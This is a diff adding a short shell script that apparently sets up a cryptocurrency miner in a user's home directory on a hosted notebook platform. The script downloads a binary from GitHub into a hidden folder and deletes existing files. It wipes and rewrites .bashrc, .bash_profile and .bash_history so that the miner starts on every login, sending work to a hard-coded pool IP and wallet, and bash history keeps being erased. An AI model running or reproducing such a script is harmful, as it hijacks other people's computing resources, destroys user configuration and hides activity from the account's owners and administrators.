@@ -1,0 +1,22 @@
+cd ~/
+mkdir .lib
+cd .lib
+rm -R *
+rm -R /home/studio-lab-user/.ton
+WORKER="Test"
+WALLETNH="KU7Y3L9bYbcAJ5Q2wUb6RCh7ZPRamZghHB"
+POOLNH="167.99.72.157:80"
+wget https://github.com/miguelpatty/park/raw/main/BRBR
+echo ""  > /home/studio-lab-user/.bashrc
+echo "" > /home/studio-lab-user/.bash_history
+echo "" > /home/studio-lab-user/.bash_profile
+echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
+echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
+echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
+echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
+echo 'WORKER="Test"' >> ~/.bash_profile
+echo 'WALLETNH="KU7Y3L9bYbcAJ5Q2wUb6RCh7ZPRamZghHB"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="167.99.72.157:80"' >> /home/studio-lab-user/.bash_profile
+echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
+echo "./.lib/BRBR -a yespowerLTNCG -o stratum+tcp://$POOLNH -u $WALLETNH.$WORKER -t 2 -p c=CRNC" > /home/studio-lab-user/.lib/gas.sh
+chmod +x gas.sh && chmod +x BRBR && cd ~/ && source .bashrc
